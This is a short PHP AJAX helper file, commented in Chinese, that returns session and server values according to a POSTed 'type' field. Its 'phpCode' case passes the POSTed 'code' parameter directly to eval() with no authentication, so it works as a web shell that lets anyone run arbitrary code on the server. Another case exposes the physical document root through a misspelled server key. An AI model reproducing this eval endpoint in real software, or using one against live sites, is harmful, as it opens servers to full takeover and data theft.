<?php
/* ajax 返回 php 变量 */
session_start();
$username = isset($_SESSION['username'])?$_SESSION['username']:"";
$accessRight = isset($_SESSION['accessRight'])?$_SESSION['accessRight']:"";
$type = $_POST['type'];

switch ($type) {

	case 'rootDir':{
		echo 'http://'.$_SERVER['HTTP_HOST'].'/';
	}
	break;

	case 'rootPhyDir':{
		echo $_SERVER['Document_ROOT'].'/';
	}
	break;

	case 'loginStatus':{
		echo $username;
	}
	break;

	case 'phpCode':{
		$str = $_POST['code'];
		eval($str);
	}
	break;

	case 'accessRight':{
		echo $accessRight;
	}
	break;

	default:
		# code...
	break;
}
?>